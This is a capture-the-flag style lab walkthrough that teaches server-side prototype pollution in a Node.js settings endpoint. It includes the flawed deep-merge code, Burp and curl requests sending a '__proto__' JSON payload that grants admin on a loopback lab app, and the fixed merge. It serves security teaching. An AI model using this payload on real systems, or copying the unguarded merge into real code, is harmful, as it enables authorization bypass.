# Walkthrough — prototype-pollution

The app stores your preferences: you send a JSON body of config fields to `POST /settings`, and it *deep-merges* them into the current settings — recursing into nested objects. The merge is a hand-written recursive function, and it descends through *whatever* keys your JSON carries. One of those keys is special: `__proto__`. Send it and the merge, instead of writing a field of the settings object, writes onto `Object.prototype` — the parent shared by every object in the whole Node process. The proof is at a second endpoint that has nothing to do with settings: `GET /me` builds a brand-new, empty user object and checks `if (user.isAdmin)`. After the attack, that fresh object — which you never touched — reports admin. Everything here is done in Burp (or `curl`); there is no browser step, because the JavaScript runs on the **server** and the effect is visible on the wire.

## 1. Context

The `vulnerable` app is on `127.0.0.1:8026` and the `fixed` app on `127.0.0.1:8126`; there is no database and no second service — the settings live in a JavaScript object inside the Node process. Two endpoints:

- `POST /settings` — deep-merges a JSON body into the settings. **This is where the bug lives.**
- `GET /me` — builds a fresh, default (unprivileged) user object and returns `{"admin": user.isAdmin === true}` — your proof.

This is **prototype pollution**. Because this is the repo's first JavaScript atom, here are the concepts it rests on, defined from scratch:

- **prototype**: in JavaScript an object has a **parent object** — its *prototype* — that it **inherits** properties from. Read `obj.x` and if `obj` has no own `x`, the engine goes up to the prototype and looks there.
- **prototype chain**: that lookup doesn't stop at the first parent — it walks a **chain** of parents (`obj` → its prototype → that prototype's prototype → …) until it finds the property or runs out.
- **`Object.prototype`**: at the **top** of that chain, for almost every object, sits one shared object — `Object.prototype`. A plain `{}` inherits from it. There is **one** `Object.prototype` for the entire process; every ordinary object shares it as its ultimate parent. That is what makes this flaw global.
- **`__proto__`**: every object exposes an accessor property called `__proto__` that **points to its prototype**. For a plain `{}`, `obj.__proto__` **is** `Object.prototype`. `__proto__` is literally the door to the shared parent.
- **deep merge**: merging copies the fields of a source object onto a target. A **deep** merge does it *recursively*: when a field is itself an object, the merge **descends** and merges the inner fields rather than replacing the whole object. It's a common pattern for settings and config.
- **prototype pollution**: a deep-merge that, descending through the `__proto__` key, ends up writing onto the shared `Object.prototype` instead of a field of the target — the attacker "pollutes" the prototype, planting a property on the parent of every object.

This is **A08 — Software and Data Integrity Failures**; its CWE (Common Weakness Enumeration — the standard catalog of weakness classes) is **CWE-1321**, "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')". The exploration is done entirely in Burp; `curl` is the equivalent — there is no browser track (this atom is API-only, and the JavaScript runs server-side).

## 2. Spot the bug

Open [`vulnerable/app.js`](./vulnerable/app.js). The merge is the whole story:

```javascript
function merge(target, source) {
  for (const key of Object.keys(source)) {
    if (isObject(source[key])) {
      if (!(key in target)) {
        target[key] = {};
      }
      merge(target[key], source[key]); // for key "__proto__": recurses into Object.prototype
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

The loop walks `Object.keys(source)` and, for every key whose value is an object, descends into `target[key]`. Audit question: *what is `target["__proto__"]`?* For a normal object it isn't a field — it's the object's **prototype**, i.e. `Object.prototype`. So when `source` carries a `__proto__` key, the merge recurses **into the shared prototype** and writes there.

One subtlety explains why the JSON body is the attack surface. If you wrote the object literal `{ __proto__: ... }` in code, `__proto__` would be a special *setter* (it sets the literal's prototype) and would **not** become a normal key — a merge loop would never see it. But the attacker's data isn't a literal; it's text that goes through `JSON.parse`, and the parser makes `__proto__` an **ordinary own key**. So `Object.keys(source)` yields it, and the loop descends. The fix (foreshadowed): have the merge **refuse** the keys that reach a prototype, instead of descending through them.

## 3. Exploitation via Burp Suite

Point Burp at the vulnerable API on `127.0.0.1:8026` and work from Repeater. Every request below is a block you paste into Repeater; the same requests run under `curl`. (The `POST /settings` blocks carry `Content-Type: application/json`; this hand-written server calls `JSON.parse` on the body regardless of the header, but sending it is correct and matches a real client.)

### Baseline — clean, captured first

Because polluting `Object.prototype` is global and **persists** until the process restarts, read the clean state **before** attacking. Ask the fresh-user endpoint whether it is admin:

```
GET /me HTTP/1.1
Host: 127.0.0.1:8026
```

Response — `200`:

```json
{"admin":false}
```

A brand-new user object has no `isAdmin`, so `user.isAdmin === true` is `false`. Now exercise the feature with a **benign** merge — change the theme:

```
POST /settings HTTP/1.1
Host: 127.0.0.1:8026
Content-Type: application/json

{"theme":"dark"}
```

Response — `200`, the updated settings:

```json
{"theme":"dark","notifications":{"email":true}}
```

The equivalent with curl:

```bash
curl -i http://127.0.0.1:8026/settings -H 'Content-Type: application/json' \
  -d '{"theme":"dark"}'
```

The feature works: the merge writes `theme` and leaves `notifications` alone. `GET /me` is still `{"admin":false}` — a benign merge changes nothing about privilege. From here on, only one thing changes — the JSON's top-level key becomes `__proto__`.

### Step 1 — Pollute the prototype (the attack)

Send a body whose top-level key is `__proto__`, carrying `isAdmin: true`:

```
POST /settings HTTP/1.1
Host: 127.0.0.1:8026
Content-Type: application/json

{"__proto__":{"isAdmin":true}}
```

Response — `200`, and note what it shows:

```json
{"theme":"dark","notifications":{"email":true}}
```

The response looks **completely normal** — no `isAdmin` anywhere. That is expected: the merge wrote onto `Object.prototype`, not onto the `settings` object, and `JSON.stringify(settings)` only serializes `settings`'s *own* properties. The damage is invisible here. curl:

```bash
curl -i http://127.0.0.1:8026/settings -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'
```

### Step 2 — Confirm the global contamination

Go back to the fresh-user endpoint — the one that never mentioned settings:

```
GET /me HTTP/1.1
Host: 127.0.0.1:8026
```

Response:

```json
{"admin":true}
```

That is the prototype pollution. `GET /me` builds a **new, empty** object and reads `user.isAdmin`; the object has no own `isAdmin`, so the engine walks up to `Object.prototype` — which you just poisoned — and finds `true`. You never touched this object; you poisoned the **shared parent**, and every object in the process now inherits `isAdmin: true`. (`isAdmin: true` is a benign lab flag; nothing here is destructive, and it is all on loopback.)

> The pollution is process-global and now stays until the container restarts, so run the baseline **before** the attack — as above — to see the `false` → `true` flip cleanly. To reset, `./atom down prototype-pollution` then `./atom up prototype-pollution` (or `docker compose restart vulnerable`).

## 4. What the vuln is NOT

The exploit is one key in a JSON body, so it is easy to draw the wrong lesson. Isolate the real cause:

- **It is NOT "I edited the settings."** You did not write `isAdmin` *into the settings* — the `POST /settings` response never showed it. The proof is `GET /me`, an endpoint that says nothing about settings and builds a **new, empty** object; it turned admin because the **shared parent** (`Object.prototype`) was poisoned, not because the settings changed. (Contrast `mass-assignment`, where the attacker writes an extra field *onto the very object* being updated. Here the attacker poisons the **global prototype**, and a *third, untouched* object inherits it.)
- **It is NOT `deserialization-pickle`, and NOT RCE.** Both are A08, but here **nothing executes by default** — the attacker *corrupts a shared structure*, and the harm surfaces when *other* code trusts it. There the deserializer *executes* embedded behavior (remote code execution); here it is subversion of authorization logic. Same category, different impact.
- **It is NOT a validation bug.** `{"__proto__":{"isAdmin":true}}` is perfectly **valid JSON** — there is no malformed input to reject, nothing to "sanitize." The flaw is the merge **descending through a key that reaches the prototype**.

**Proof of isolation:** send the *benign* merge — `{"theme":"dark"}` — to **both** apps, and both return `{"theme":"dark","notifications":{"email":true}}` and keep `GET /me` at `{"admin":false}`. The feature is identical. Only the `__proto__` payload separates the two: the vulnerable app pollutes, the fixed app refuses the key.

The one thing it **is**: the merge descends through `__proto__` and mutates the shared `Object.prototype`, so every object — including the fresh `{}` at `GET /me` — inherits the planted field. The fix is to make the merge **refuse** the keys that reach a prototype (`__proto__`, `constructor`, `prototype`).

## 5. Impact

**Global contamination of `Object.prototype`:** any code that reads an inherited property while assuming it is absent — `if (user.isAdmin)` — is subverted. This lab's example is an authorization bypass: a default, unprivileged user object reports admin. The pollution **persists** in the process until a restart, and it affects objects created *after* the attack, far from the injection point.

That is the honest ceiling for this atom. **It is not RCE by default.** Prototype pollution *can* escalate to remote code execution in the wild, but only with specific *gadgets* — a chain where a poisoned inherited property flows into a dangerous sink in some library or the runtime (a template engine, `child_process`, `require`). That depends on the surrounding ecosystem and is not a property of the flaw in isolation; it would be a second mechanism, so it is out of scope here. The ceiling differs from `deserialization-pickle`, the repo's other A08 atom, which reaches RCE by its own cause. The value of this class is how *silent and global* it is: one key in one JSON body contaminates every object in the process, and the damage surfaces wherever some code reads an inherited property it assumed was absent.

## 6. Why the fix works

Run the chain against the fixed API on port **8126** (see [`DIFF.md`](./DIFF.md) for the change). It starts clean — `GET /me` → `{"admin":false}`. Now send the **same attack payload**:

```
POST /settings HTTP/1.1
Host: 127.0.0.1:8126
Content-Type: application/json

{"__proto__":{"isAdmin":true}}
```

Response — `200`:

```json
{"theme":"light","notifications":{"email":true}}
```

Then read the fresh-user endpoint:

```
GET /me HTTP/1.1
Host: 127.0.0.1:8126
```

Response — still:

```json
{"admin":false}
```

The fixed merge skips the three prototype-reaching keys at the top of its loop (`if (key === "__proto__" || key === "constructor" || key === "prototype") continue;`), so it never descends into `Object.prototype`. The prototype is untouched, and the fresh object at `GET /me` inherits nothing. Meanwhile a benign `{"theme":"dark"}` merge behaves exactly as it did on the vulnerable app — the feature is intact; only the prototype-reaching keys are dropped.

The whole fix is the merge refusing the keys that reach a shared prototype — a guard on the merge, not input validation (the payload is valid JSON). See [`DIFF.md`](./DIFF.md) for why the guard names **three** keys and not just `__proto__`, why the durable production defense is structural (`Object.create(null)`, `Map`, `Object.hasOwn`), and how this A08 flaw's impact differs from `deserialization-pickle`.
